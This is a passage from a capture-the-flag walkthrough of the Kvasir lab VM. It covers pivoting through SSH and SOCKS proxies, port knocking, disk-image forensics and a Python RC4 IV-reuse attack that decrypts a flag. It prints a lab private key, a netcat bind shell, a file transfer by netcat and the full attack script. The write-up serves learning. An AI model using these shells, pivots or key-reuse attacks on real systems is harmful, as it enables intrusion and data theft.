4+HhImnEpLZQOXhfXlkKMQXrBys7hkonkDp57Vqh+IIZLGzVmfTVEj2Whc/0Y+GI
DMph0ZvTG+Jgv1LO3Sl82Rzm1jUkzEIZNIxYeSGrZf6ChVLPa85axqw5EVNCxYUg
JAqg+ud6xIO9obidxzI2rLfbxcpMur80nb4crYMNm09yPQaskngK/4IjmnPLeTih
-----END RSA PRIVATE KEY-----
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A private key? Encrypted though :( Remembering the string I got from the QR code earlier that had no affiliation to anything yet, I tried that as the password to decrypt:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:# openssl rsa -in terra_key -out terra_key_nopass
Enter pass phrase for terra_key: # entered Nk9yY31hva8q
writing RSA key

root@kali:~# cat terra_key_nopass
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAyekXwhcscSSzT3vw5/eL2h1Bb55vEIOOAkQpIQQ/ldnyT6Yt
w0dAaN71JidjfojzvdaZRNrRY5wkdHUr2t93TJx8vKDZ+n5up4nCKle3p2sz2hKP
DhP7LvxkVTM7Io3qoAYXefggTOWvfoK8X8pXE3xAdIyF4uCXmDjeg6UKoCr5XiWP
12YQEODLd+tp9RH4R/rCaencsNsta45sY1NXtWuJje4HVkPV8ei04ce8SP5PwVhV
sfp2Hxr8g4IKn7ZTwtmkD1SuvmZoyDHNAsToqFt2RiVE9yLQj94Gcagx7PqUijeH
b+4T+6tuDZtjgct4RdYZejnUOYx+iHiSjl6xCQIDAQABAoIBADYOi+fQ4HsiQkeD
fUn9gpnQv1Ys6rtXHUwKB6DpTETIZxFgAlyH1Py+xI+EeCTGcctfiwVeODUc9r2f
KTCeJ4iBVPwDbJieBO4h+bPwbCEMmINH+LjiLJu1wv70il6D9E8Hkn17Ktqrm8KZ
KenTeGClIXSSsr29N5jvkNNZ+nBK116l2TNNSsiWGc3VnezgCuRnDMSuKmA4P/OD
5F/h2/1sC33P1P5zxSMMsUZbm616AXNdv2DxHYm5b7p0L3/wzpZaJ+ZCp9jutbMO
P7XADZrFSn1EOk9blfVQz77GhRUVAotXKv7Jj4x+zHjq2l3n2Jk5RwJLl8iw4vZ+
ActgrskCgYEA5RhweA1naUanRJtlnLY4ywjfpZffPOZovmthqeOYdSJmwdmKvf08
bBR7hRwwlwgD92jeZWC1nK2zjwVpVQqV3sq4+x6Yspp0T5d9hp7PqUvPGglRdPXX
JQjMBV/Q2fK+ydnTz3xImjIvGsoFya9B/COKicu5ugCklCxtdNPJd/8CgYEA4Z9c
cekfgeha7sYe202krz0m03b8IqFaEMBUkEDmr8+RTL2H+9ciu3/2y/0UJ20w3qwe
gWv2OvOmumJ2wi/HVQdoQ9purzKWDdes6QrQsZ6+4eeylQmVmBSOF9YiVudSwyBM
+2rmE4m4qAIVidIJskb6DpB+fxDU1iWFLHlUFvcCgYEArxV8buOfkp+CmjZA9AF3
agQAGCf3Xi2hA1ZBr3rXOz3tVl0RYZ21ncwRkms231Yq4dxtiwDcCz/dKIK0O1/5
pek8cf6yKF1OYr2eG1In1nSvdHCGpmJz6EPO2JSfotGX6d/ltn5/ZgjQYyLeRYMB
ZNcsu57M9FAld3B0voJVSLUCgYACac72VPUGUbLvTOU1mU4CpdfNeT9XK3yoIzaE
WH1fMgwu0vQqaHGxqbu9ENbvWQalyxeEcOAwXzzQT49Pom0yZqLh3utCKntaaI0r
7Pawf68xAWZym6ii+M1QSfUSEuVauvS317vgR5/XBDaww7Ng2cuA7mC8ATUVmU8k
W6PfnwKBgQCBapB8OxxeRoFlnctafkTqtlNU5MGgiUGCCk/NNpDJhzaBuSdxdbRB
bQ6OJjQ9fbjF24w1iOJCGTtMQ0fxer7oxoM8TblM/eYx3Dg6MwsVApP75VdqzSas
mlJnXivwgJkeju+L42BMEl4UaxuhFPBSNCmlLBPj3Hdgyh5LSyIKmw==
-----END RSA PRIVATE KEY-----
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Considering that &lt;strong&gt;192.168.3.50&lt;/strong&gt; was named as &lt;code&gt;terra&lt;/code&gt; in that &lt;code&gt;/etc/hosts&lt;/code&gt; file, I attempted authentication using this key on it:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# proxychains ssh -D 8001 terra@192.168.3.50 -i terra_key_nopass
ProxyChains-3.1 (http://proxychains.sf.net)
Linux dev2 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Sun Nov  9 07:13:31 2014 from 192.168.3.200
terra@dev2:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;As you can see, I also opened another socks proxy locally on port &lt;code&gt;tcp/8001&lt;/code&gt; in the case for any further pivoting needs. Again, to make sure we understand where in the network we are, consider the following diagram, with the path to &lt;code&gt;dev2&lt;/code&gt; in red:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_network_graph_5.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;letting-myself-in-via-the-back-door&#34;&gt;letting myself in via the back door&lt;/h2&gt;

&lt;p&gt;Enumerating &lt;code&gt;dev2&lt;/code&gt; did not reveal much interesting information. In fact, the most important clue found was in a mail for &lt;code&gt;terra&lt;/code&gt; from Locke:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;terra@dev2:~$ cat /var/spool/mail/terra
Return-path: &amp;lt;locke@192.168.4.100&amp;gt;
Received: from locke by 192.168.4.100 with local (Exim 4.80)
~       (envelope-from &amp;lt;locke@adm&amp;gt;)
~       id 1XHczw-0000V2-8y
~       for terra@192.168.3.50; Wed, 13 Aug 2014 19:10:08 +0100

Date: Wed, 13 Aug 2014 19:10:08 +0100
To: terra@192.168.3.50
Subject: Port Knock
User-Agent: Heirloom mailx 12.5 6/20/10
MIME-Version: 1.0
Content-Type: text/plain; charset=us-ascii
Content-Transfer-Encoding: 7bit
Message-Id: &amp;lt;E1XHczw-0000V2-8y@adm&amp;gt;
From: locke@192.168.4.100
~
Hi Terra,

I&#39;ve been playing with a port knocking daemon on my PC - see if you can use that to get a shell.
Let me know how it goes.

Regards,
Locke
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Port knocking daemon eh? Admittedly at this stage again I was kinda stuck. Did I miss the sequence to knock on my way here? While wondering about this, I setup to run a port scan on &lt;strong&gt;192.168.4.100&lt;/strong&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# /etc/proxychains.conf has line
# socks5    127.0.0.1 8001

# scans will appear to be coming from 192.168.4.50 for
# 192.168.4.100
root@kali:~# proxychains nmap -sT 192.168.4.100
ProxyChains-3.1 (http://proxychains.sf.net)

Starting Nmap 6.46 ( http://nmap.org ) at 2014-11-09 17:39 SAST
Nmap scan report for 192.168.4.100
Host is up (0.0018s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE
22/tcp open  ssh

Nmap done: 1 IP address (1 host up) scanned in 1.75 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Only &lt;code&gt;tcp/22&lt;/code&gt;. :s&lt;/p&gt;

&lt;p&gt;I started working back a little bit to some of the previous machines in search for clues, but, found nothing concrete. Remembering the port knocking daemon used in &lt;a href=&#34;http://vulnhub.com/entry/knock-knock-11,105/&#34;&gt;Knock Knock&lt;/a&gt; (&lt;code&gt;knockd&lt;/code&gt;), I went and searched for its configuration file, looking for the default port sequence it is configured with. I found the config file &lt;a href=&#34;https://github.com/jvinet/knock/blob/master/knockd.conf&#34;&gt;here&lt;/a&gt;, which revealed the default sequence of: &lt;code&gt;7000,8000,9000&lt;/code&gt;. So, I tested this by attempting to connect with &lt;code&gt;nc&lt;/code&gt; to these ports on &lt;strong&gt;192.168.4.100&lt;/strong&gt;, and following up with a nmap:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;terra@dev2:~$ nc -v 192.168.4.100 7000 -w 1; nc -v 192.168.4.100 8000 -w 1; nc -v 192.168.4.100 9000 -w 1
192.168.4.100: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [192.168.4.100] 7000 (afs3-fileserver) : Connection refused
192.168.4.100: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [192.168.4.100] 8000 (?) : Connection refused
192.168.4.100: inverse host lookup failed: Host name lookup failure
(UNKNOWN) [192.168.4.100] 9000 (?) : Connection refused
terra@dev2:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The nmap after the knock:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# proxychains nmap -sT 192.168.4.100
ProxyChains-3.1 (http://proxychains.sf.net)

Starting Nmap 6.46 ( http://nmap.org ) at 2014-11-09 17:45 SAST
Nmap scan report for 192.168.4.100
Host is up (0.0015s latency).
Not shown: 998 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
1111/tcp open  lmsocialserver

Nmap done: 1 IP address (1 host up) scanned in 1.71 seconds

&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A new port! &lt;code&gt;tcp/1111&lt;/code&gt; :) Lets check it out.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# proxychains nc 192.168.4.100 1111
ProxyChains-3.1 (http://proxychains.sf.net)

# a new connection has no output. Only after typing
# &#39;crap&#39; do you realise you have a sh session open

id
uid=1000(locke) gid=1000(locke) groups=1000(locke)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Shell access as &lt;code&gt;locke&lt;/code&gt; on &lt;strong&gt;192.168.4.100&lt;/strong&gt;. Nice :D To help me ensure I can comprehend where I am in the network, consider the following diagram, which is turning into a mess thanks to how deep this whole is&amp;hellip; The new connection denoted in red again:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_network_graph_6.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;h2 id=&#34;busting-kefka&#34;&gt;busting kefka&lt;/h2&gt;

&lt;p&gt;The shell on &lt;code&gt;adm&lt;/code&gt; as &lt;code&gt;locke&lt;/code&gt; was nothing more than a &lt;code&gt;/bin/sh&lt;/code&gt; instance executed over &lt;code&gt;netcat&lt;/code&gt;. This can be seen in the &lt;code&gt;littleShell.sh&lt;/code&gt; file in &lt;code&gt;/home/locke&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cat littleShell.sh
#!/bin/sh

/bin/nc -lnp 1111 -e &#39;/bin/sh&#39;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Other interesting files were all in &lt;code&gt;locke&lt;/code&gt;&amp;rsquo;s home directory:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;pwd
/home/locke
ls -lh
total 332K
-rw-r--r-- 1 locke locke 322K Aug 10 10:32 diskimage.tar.gz
-rwxr--r-- 1 locke locke   42 Aug 13 17:59 littleShell.sh
-rw-r--r-- 1 locke locke  110 Sep  4 13:38 note.txt
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The &lt;code&gt;note.txt&lt;/code&gt; file:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;cat note.txt
Looks like Kefka may have been abusing our removable media policy.  I&#39;ve extracted this image to have a look.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Awesome. That gives me a pretty clear idea of where this may be going. My guess was I needed to find something interesting in the &lt;code&gt;diskimage.tar.gz&lt;/code&gt; file to progress. The first thing I had to do was get a local copy of &lt;code&gt;diskimage.tar.gz&lt;/code&gt;. Out comes &lt;code&gt;netcat&lt;/code&gt; again :) I hosted the file on &lt;code&gt;tcp/4444&lt;/code&gt; on &lt;strong&gt;192.168.4.100&lt;/strong&gt; with &lt;code&gt;nc -lvp 4444 &amp;lt; diskimage.tar.gz | xxd -p&lt;/code&gt;. I then read the file on my attacking machine with &lt;code&gt;timeout 5 proxychains nc 192.168.4.100 4444 &amp;gt; diskimage.tar.gz&lt;/code&gt; (I gave the file 5 seconds to come over before killing the connection, allowing my other netcat shell to stay alive).&lt;/p&gt;

&lt;p&gt;I had to carve out the string &lt;em&gt;ProxyChains-3.1 (&lt;a href=&#34;http://proxychains.sf.net&#34;&gt;http://proxychains.sf.net&lt;/a&gt;)&lt;/em&gt; out of the archive I get locally on disk due to the proxychains command adding this. Luckily it was a simple &lt;code&gt;dd&lt;/code&gt; on the top line and it was gone :)&lt;/p&gt;

&lt;p&gt;I then extracted the archive and ran the resultant archive through &lt;code&gt;file&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# tar xvf diskimage.tar.gz
diskimage

root@kali:~# file -k diskimage
diskimage: x86 boot sector, code offset 0x3c, OEM-ID &amp;quot;MSDOS5.0&amp;quot;, sectors/cluster 2, root entries 512, Media descriptor 0xf8, sectors/FAT 238, heads 255, hidden sectors 63, sectors 122031 (volumes &amp;gt; 32 MB) , reserved 0x1, serial number 0xad6f8bf, unlabeled, FAT (16 bit) DOS executable (COM), boot code
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Ok, so this really looks like a disk image. I decided to mount it and have a look inside:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# mount diskimage /mnt/

root@kali:~# ls -lah /mnt/
total 21K
drwxr-xr-x  2 root root  16K Jan  1  1970 .
drwxr-xr-x 23 root root 4.0K Sep 17 13:04 ..
-rwxr-xr-x  1 root root  118 Aug  3 12:10 Secret.rar

# oh! a .rar? Lets extract...
root@kali:~# unrar x /mnt/Secret.rar

UNRAR 4.10 freeware      Copyright (c) 1993-2012 Alexander Roshal


Extracting from /mnt/Secret.rar

Enter password (will not be echoed) for MyPassword.txt:

No files to extract
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A &lt;code&gt;.rar&lt;/code&gt; archive, but no password to extract. Aaaand again, I was stuck. My guess was there was some forensics aspect to this, and that the disk image may be more than just a disk image&amp;hellip;&lt;/p&gt;

&lt;p&gt;Some googling around got me a hit on a tool called &lt;code&gt;autopsy&lt;/code&gt;, which is a disk image analysis framework. I cared little for the case files features and what not, but much rather the actual analysis features. I fired up the tool from the Kali menu, and browsed to the web interface. I had a whole bunch of prompts to work through, and eventually came to a view that allowed me to inspect the disk:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_autospy.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;&lt;code&gt;C:/Funky.wav&lt;/code&gt;. Now that is not something I saw when I had the disk mounted :D. I downloaded the file via the &lt;em&gt;Export&lt;/em&gt; link, copied it to my laptop (my Kali doesnt have sound for whatever reason) and fired up the speakers to have a listen.&lt;/p&gt;

&lt;p&gt;It sounded like this:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_wut_sound.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Yeah, I don&amp;rsquo;t get it either. I was stumped for a few minutes again, until I remembered &lt;a href=&#34;http://vulnhub.com/entry/xerxes-201,97/&#34;&gt;Xerxes2&lt;/a&gt;, which has a similar strange sounding file, but with a hidden message viewable via a spectrogram generated by &lt;a href=&#34;http://www.sonicvisualiser.org/index.html&#34;&gt;Sonic Visualizer&lt;/a&gt;. I downloaded the app, loaded the wav file and got the spectrogram to do its thing:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/kvasir_sonic_viz.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;&lt;em&gt;OrcWQi5VhfCo&lt;/em&gt;. Was this the password for the &lt;code&gt;.rar&lt;/code&gt; archive?&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# unrar x /mnt/Secret.rar

UNRAR 4.10 freeware      Copyright (c) 1993-2012 Alexander Roshal


Extracting from /mnt/Secret.rar

Enter password (will not be echoed) for MyPassword.txt:

Extracting  MyPassword.txt                                            OK
All OK
root@kali:~# cat MyPassword.txt
5224XbG5ki2C
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yep! However, another random string. Remembering the note about this being a disk image from &lt;code&gt;kefka&lt;/code&gt;, I attempted to SSH into &lt;strong&gt;192.168.4.100&lt;/strong&gt; as &lt;code&gt;kefka&lt;/code&gt; with this password:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# proxychains ssh -D 8002 kefka@192.168.4.100
ProxyChains-3.1 (http://proxychains.sf.net)
kefka@192.168.4.100&#39;s password: # entered 5224XbG5ki2C
Linux adm 3.2.0-4-amd64 #1 SMP Debian 3.2.60-1+deb7u3 x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Sun Nov  9 07:14:02 2014 from 192.168.4.50
kefka@adm:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A final &lt;code&gt;tcp/8002&lt;/code&gt; proxy was opened on my attacking machine.&lt;/p&gt;

&lt;h2 id=&#34;taking-the-last-ride-to-the-flag&#34;&gt;taking the last ride to the flag&lt;/h2&gt;

&lt;p&gt;Enumeration as kefka revealed that this user is allowed to run &lt;code&gt;/opt/wep2.py&lt;/code&gt; as root. This is almost screaming at me as the privilege escalation path!&lt;/p&gt;

&lt;p&gt;I ran the script with sudo, just to be presented with&amp;hellip; nothing :/ No matter what I typed in, I received no output. That was until I ^C the application and receive a traceback, hinting towards the fact that it may have opened a socket:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;kefka@adm:~$ sudo /opt/wep2.py
^CTraceback (most recent call last):
  File &amp;quot;/opt/wep2.py&amp;quot;, line 93, in &amp;lt;module&amp;gt;
    sock, addr = s.accept()
  File &amp;quot;/usr/lib/python2.7/socket.py&amp;quot;, line 202, in accept
    sock, addr = self._sock.accept()
KeyboardInterrupt
kefka@adm:~$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I re-run the script backgrounding it with &lt;code&gt;&amp;amp;&lt;/code&gt;, and inspect the output of &lt;code&gt;netstat -pant&lt;/code&gt; to reveal a port 1234 to be open. From my attacking machine, I connected to the socket using proxychains on the new &lt;code&gt;tcp/8002&lt;/code&gt; proxy. The 127.0.0.1 is in fact 192.168.4.100 and not my actual localhost:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# /etc/proxychains.conf has line
# socks5    127.0.0.1 8002

# connections will appear to be coming from localhost
root@kali:~# proxychains nc -v 127.0.0.1 1234
ProxyChains-3.1 (http://proxychains.sf.net)
127.0.0.1: inverse host lookup failed:
(UNKNOWN) [127.0.0.1] 1234 (?) open : Operation now in progress
=============================
Can you retrieve my secret..?
=============================

Usage:
&#39;V&#39; to view the encrypted flag
&#39;E&#39; to encrypt a plaintext string (e.g. &#39;E AAAA&#39;)

V
5a5062:36507a63b56865f7fd201860
^C
root@kali:~#
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We are presented with yet another &lt;em&gt;game&lt;/em&gt;, this time, something completely different. I played a little with the output, attempting to escape the environment. Most input would be picked up as invalid input, and the &lt;code&gt;netcat&lt;/code&gt; connection killed, causing me to have to re-run &lt;code&gt;sudo /opt/wep2.py&lt;/code&gt; on the kefka session.&lt;/p&gt;

&lt;p&gt;By now, I was pretty exhausted from everything Kvasir has thrown at me and the rabbit hole has become pretty deep and dark. From testing the above game, I guessed that the output for commands were &lt;code&gt;salt:cyphertext&lt;/code&gt;, which changes for anything you throw at it. Furthermore, the game allows you to encrypt known clear text. As a test, I tested with &lt;em&gt;A&lt;/em&gt;, and studied the output:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;E A
348bbc:8d
E A
f2fb0c:6e
E A
64d7fb:2d
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Assuming the first part is the salt, my text is encrypted and presented as a single hex byte. Other than that, I am not really sure what my attack vectors are, if any.&lt;/p&gt;

&lt;p&gt;Taking it easy for a while, I had a chat to @barrebas on how far I am with Kvasir, when he mentioned that the filename &lt;code&gt;wep2.py&lt;/code&gt; should be taken as a hint!&lt;/p&gt;

&lt;p&gt;&lt;em&gt;This had to be the hardest part of the entire challenge for me personally. The largest part of this was spent reading reading reading and more reading! Ofc, this is also my biggest take from Kvasir :)&lt;/em&gt;&lt;/p&gt;

&lt;h3 id=&#34;understanding-what-wep-actually-is&#34;&gt;understanding what WEP actually is&lt;/h3&gt;

&lt;p&gt;With the limited interaction I have had with the last game, and the hint &lt;code&gt;wep2&lt;/code&gt;, I set out to test my Google-fu. I know there is no such thing as WEP2, but there is WPA2. So the first part was to determine if the hint is something like WEP or WPA2.&lt;/p&gt;

&lt;p&gt;Some resources that really helped me get to grips with what we are facing here was:
 &lt;a href=&#34;http://www.isaac.cs.berkeley.edu/isaac/mobicom.pdf&#34;&gt;http://www.isaac.cs.berkeley.edu/isaac/mobicom.pdf&lt;/a&gt;
 &lt;a href=&#34;http://www.csee.umbc.edu/courses/graduate/CMSC628/spring2002/ppt/kunjan.ppt&#34;&gt;http://www.csee.umbc.edu/courses/graduate/CMSC628/spring2002/ppt/kunjan.ppt&lt;/a&gt;
 &lt;a href=&#34;http://www.cs.berkeley.edu/~daw/talks/HPColloq03.ppt&#34;&gt;http://www.cs.berkeley.edu/~daw/talks/HPColloq03.ppt&lt;/a&gt;
 &lt;a href=&#34;http://www.cs.unb.ca/~ken/papers/cnsr2004.pdf&#34;&gt;http://www.cs.unb.ca/~ken/papers/cnsr2004.pdf&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Of the above list, I highly recommend you check out the &lt;code&gt;.ppt&lt;/code&gt;&amp;rsquo;s. As lame as it may seem, it really helped me just over the cliff into understanding what I was facing here and what the fundamental problem is that I should be exploiting.&lt;/p&gt;

&lt;p&gt;The reading on WPA revealed that a encrypted packet is determined similar to a RC4 stream cipher is. Let &lt;em&gt;C&lt;/em&gt; be the cipher text and &lt;em&gt;P&lt;/em&gt; be the plain text. A publicly known Initialization Vector and a Secret Key as a function of RC4 is ^ (XOR&amp;rsquo;d) with the plaintext to produce the cipher text. Typically, this is represented as:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;C = P ^ RC4(iv, k)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;With that now known, we can learn about vulnerabilities in this algorithm. More specifically, about &lt;a href=&#34;http://en.wikipedia.org/wiki/Stream_cipher_attack&#34;&gt;Stream Cipher Attacks&lt;/a&gt; and &lt;a href=&#34;http://en.wikipedia.org/wiki/Related-key_attack&#34;&gt;Related Key Attacks&lt;/a&gt;. With all of the knowledge gained with close to 6 hours of almost straight googling, I was ready to get going at trying something.&lt;/p&gt;

&lt;p&gt;My initial understanding was as follows; If I can get 2 unique plaintext’s encrypted using the same IV&amp;rsquo;s, I can XOR the cipher text of the known clear text with the actual clear text to determine the key stream for that IV. Then XOR that key stream with the cipher text I wanted to decrypt. Considering I was able to create encryption samples, I decided not to spend any time on WPA2 and concluded the &lt;code&gt;2&lt;/code&gt; in &lt;code&gt;wep2&lt;/code&gt; was another troll :)&lt;/p&gt;

&lt;h3 id=&#34;attacking-the-encryption-game&#34;&gt;attacking the encryption game&lt;/h3&gt;

&lt;p&gt;Armed with the knowledge I had now, I started to write some skeleton code to interact with the socket. This was very basic and simply sent and received frames as required.&lt;/p&gt;

&lt;p&gt;I then decided on 2 strings to test. The first being (A * 24), the second being (B * 24). The idea was to send the first string (A * 24) 1000 times, and record the IV:CIPHER_TEXT in a python dictionary. I would then loop a second time using a string of (B * 24), each time doing a lookup in the dictionary for a matching IV. If one is found, it means we have 2 known plain texts (A * 24 and B * 24), 2 known cipher texts and their common IV (iv collision in fact).&lt;/p&gt;

&lt;p&gt;Once the collision is found, I would then XOR the Cipher Text with the Clear Text to determine the key stream, and finally, XOR the key stream with any cipher text sharing the same IV to determine the clear text.&lt;/p&gt;

&lt;p&gt;I completed the python skeleton script to do the actual XOR and IV matching work, and after a few hours, had successful runs in decrypting using the key derived from the (A *24) plaintext&amp;rsquo;s cipher text:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# proxychains ./un_wep-testing.py
ProxyChains-3.1 (http://proxychains.sf.net)
[+] Generating base iv:cy dictionary with &#39;A&#39; *24
[+] iv_dict knows about 5000 combinations
[+] Starting Bruteforce with &#39;B&#39; *24
[+] Frame matched IV of 929d87 in 4559 tries!
[+] Base Cyper Text was: c5bdd075b0b1de9e9a663999a860a53348cafea5f73c794b
[+] Matched Cypher Text: c6bed376b3b2dd9d99653a9aab63a6304bc9fda6f43f7a48

[+] A ^ B
BBBBBBBBBBBBBBBBBBBBBBBB
[+] Done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This was great news, but it did not decrypt our flag :) For that, I had to bring some modifications to the code. Firstly, I tested with (A * 24) because if I know the plain text, testing is easier. I do not know the plaintext for the encrypted flag yet, so I had to be 100% sure the theory works before maybe getting a wrong answer from the flag decryption. So, I changed the IV dictionary generation from encrypting (A *24) 5000 times to requesting the encrypted flag 5000 times.&lt;/p&gt;

&lt;p&gt;With the changes in, I ended up with the following script:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;#!/usr/bin/python

# Kvasir RC4 Key Re-use Attack

import socket

# start a fresh iv_dict used for lookups
iv_dict = {}

# connection to the thing
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect((&#39;127.0.0.1&#39;, 1234))

# read the banner so we can continue

# =============================
# Can you retrieve my secret..?
# =============================
#
# Usage:
# &#39;V&#39; to view the encrypted flag
# &#39;E&#39; to encrypt a plaintext string (e.g. &#39;E AAAA&#39;)
banner = sock.recv(1024)

# create some iv:cyper combinations of the flag
print &#39;[+] Generating base iv:cy dictionary&#39;
for i in range(0,5000):
    sock.send(&#39;V\n&#39;)
    frame = sock.recv(150)
    iv = frame.split(&#39;:&#39;)[0]
    cy = frame.split(&#39;:&#39;)[1]

    # add the values
    iv_dict[iv] = cy.strip()
print &#39;[+] The iv_dict knows about %d combinations&#39; % len(iv_dict)

# start processing the second string, looking up the IV
print &#39;[+] Starting Bruteforce with \&#39;B\&#39; *24&#39;
count = 0
while True:

    count += 1
    sock.send(&#39;E &#39; + &#39;B&#39; *24 + &#39;\n&#39;)
    frame = sock.recv(150)
    iv = frame.split(&#39;:&#39;)[0]
    cy = frame.split(&#39;:&#39;)[1].strip() # annoying \n

    if iv in iv_dict:
        print &#39;[+] Frame matched IV of %s in %d tries!&#39; % (iv, count)
        print &#39;[+] Base Cyper Text was: %s&#39; % iv_dict[iv]
        print &#39;[+] Matched Cypher Text: %s&#39; % cy

        # first XOR to get the keystream for this IV
        keystream = &#39;&#39;.join(chr(ord(a) ^ ord(b)) for a,b in zip(cy.decode(&amp;quot;hex&amp;quot;),&#39;B&#39;*24))
        print &#39;[+] Keystream: %s&#39; % keystream.encode(&amp;quot;hex&amp;quot;)

        # then decode second cypher text using the keystream for the cleartext
        decrypted = &#39;&#39;.join(chr(ord(a) ^ ord(b)) for a,b in zip((iv_dict[iv]).decode(&amp;quot;hex&amp;quot;),keystream))
        print &#39;[+] Decrytped flag is: %s&#39; % decrypted
        break

    # progress incase things take longer than expected
    if count % 100000 == 0:
        print &#39;[+] Tries: %d&#39; % count

print &#39;[+] Done&#39;
sock.close()
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;In no time at all, the above code outputs the decrypted flag:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# proxychains ./un_wep.py
ProxyChains-3.1 (http://proxychains.sf.net)
[+] Generating base iv:cy dictionary
[+] The iv_dict knows about 5000 combinations
[+] Starting Bruteforce with &#39;B&#39; *24
[+] Frame matched IV of 06f39e in 1696 tries!
[+] Base Cyper Text was: 02bf9ad2d5629c9f530b39a6
[+] Matched Cypher Text: 70aaeec5a156a99a251e4ab2217436ae08a64b5ce0c21c9c
[+] Keystream: 32e8ac87e314ebd8675c08f0633674ec4ae4091ea2805ede
[+] Decrytped flag is: 0W6U6vwG4W1V
[+] Done
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;0W6U6vwG4W1V&lt;/code&gt;. Seriously. All that work for another string. :( I immediately started to doubt if I nailed this. I tested this as the root password for all the previous machines I have not been root on yet to no avail. Then, I looked at the clock as saw it was 3am&amp;hellip; bed time for me!!&lt;/p&gt;

&lt;h2 id=&#34;finally-getting-the-flag-sort-of&#34;&gt;finally getting the flag, sort of&amp;hellip;&lt;/h2&gt;

&lt;p&gt;I woke up 7am, immediately thinking about this small string and the amount of work that went into getting it. I double checked my theory and script to make sure I am not missing something, but everything seemed to look fine.&lt;/p&gt;

&lt;p&gt;After a breath of fresh air, I reconnected to the game and slapped the string in and pressed enter:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# proxychains nc -v 127.0.0.1 1234
ProxyChains-3.1 (http://proxychains.sf.net)
127.0.0.1: inverse host lookup failed:
